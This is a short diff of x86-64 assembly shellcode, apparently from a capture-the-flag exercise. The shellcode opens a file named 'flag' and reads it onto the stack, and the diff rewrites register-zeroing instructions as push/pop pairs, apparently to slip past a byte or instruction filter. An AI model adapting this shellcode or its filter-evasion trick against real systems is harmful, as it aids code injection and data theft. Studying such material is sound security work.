@@ -4,15 +4,18 @@ _start:
     push 0x67616c66
     mov rdi,rsp
     xor rax,rax
-    xor rsi,rsi
-    xor rdx,rdx
+    push rax
+    pop rsi
+    push rax
+    pop rdx
     mov al,0x2
     syscall
 
     mov rdi,rax
+    push rsi
+    pop rax
     mov rsi,rsp
     mov dl,0x40
-    xor rax,rax
     syscall
 
     xchg rax,rdx
